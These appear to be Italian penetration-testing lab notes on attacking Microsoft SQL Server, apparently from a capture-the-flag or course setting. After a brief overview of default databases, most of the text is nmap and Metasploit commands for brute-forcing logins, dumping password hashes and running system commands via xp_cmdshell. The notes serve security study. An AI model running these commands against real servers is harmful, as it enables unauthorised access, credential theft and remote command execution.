Microsoft SQL ( MSSQL) è il sistema di gestione di database relazionali basato su SQL di Microsoft. A differenza di MySQL, di cui abbiamo parlato nell'ultima sezione, MSSQL è closed source ed è stato inizialmente scritto per essere eseguito sui sistemi operativi Windows. È popolare tra gli amministratori di database e gli sviluppatori quando creano applicazioni eseguite su .NET framework di Microsoft grazie al suo forte supporto nativo per .NET. Esistono versioni di MSSQL che verranno eseguite su Linux e MacOS, ma è più probabile che incontreremo istanze MSSQL su target che eseguono Windows.


```
MSSQL DB Default:
# master: 
Tiene traccia di tutte le informazioni di sistema per un'istanza del server SQL.  
  
# model: 
Database modello che funge da struttura per ogni nuovo database creato. Qualsiasi impostazione modificata nel database modello si rifletterà in qualsiasi nuovo database creato dopo le modifiche al database modello.
  
# msdb:
SQL Server Agent utilizza questo database per pianificare processi e avvisi. 
  
# tempdb:
Memorizza oggetti temporanei.
  
# Resource:
Database di sola lettura contenente oggetti di sistema inclusi con SQL Server
```




```
## Nmap script mssql
Info:
> nmap --script ms-sql-info -p1433 10.4.21.27

Ntlm Info:
> nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -p1433 10.4.21.27

Bruteforce enumerate users and passwords:
> nmap --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt -p1433 10.4.21.27

Check empty password users:
> nmap --script ms-sql-empty-password -p1433 10.4.21.27

Dump MSSQL users hashes:
> nmap --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria -p1433 10.4.21.27

CMD shell:
> nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" -p1433 10.4.21.27

CMD shell:
> nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" -p1433 10.4.21.27






### Metasploit


Metasploit - Enum:
nmap --script ms-sql-info -p1433 10.4.23.176
msfconsole
use auxiliary/scanner/mssql/mssql_login
set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
exploit

Metasploit - Enum:
> use auxiliary/admin/mssql/mssql_enum
set RHOSTS 10.4.23.176
exploit

Metasploit - Logins: 
> use auxiliary/admin/mssql/mssql_enum_sql_logins
set RHOSTS 10.4.23.176
exploit

Metasploit - CMD command:
> use auxiliary/admin/mssql/mssql_exec
set RHOSTS 10.4.23.176
set CMD whoami
exploit

> Metasploit - enum Domain Accounts:
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set RHOSTS 10.4.23.176
exploit

```